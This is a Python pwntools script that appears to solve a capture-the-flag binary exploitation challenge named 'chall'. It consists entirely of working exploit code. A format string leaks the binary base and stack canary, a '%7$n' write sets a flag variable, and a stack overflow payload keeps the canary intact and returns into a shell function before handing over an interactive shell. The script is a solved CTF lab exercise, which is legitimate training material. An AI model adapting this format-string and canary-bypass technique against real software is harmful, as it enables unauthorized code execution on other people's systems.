#!/usr/bin/python3
from pwn import process, p64

shell = process("./chall")

shell.sendlineafter(b":\n", b"%p.%19$p")
leak = shell.recvline().strip().decode().split(".")

binary_base = int(leak[0], 16) - 0x2061
canary = p64(int(leak[1], 16))

can_leave = p64(binary_base + 0x401c)
get_shell = p64(binary_base + 0x125c)
ret = p64(binary_base + 0x101a)

payload  = b""
payload += b"A" * 104
payload += canary
payload += b"B" * 8
payload += ret
payload += get_shell

shell.sendlineafter(b":\n", b"..%7$n.." + can_leave)
shell.sendlineafter(b":\n", payload)
shell.sendlineafter(b':\n', b'--')

shell.interactive()
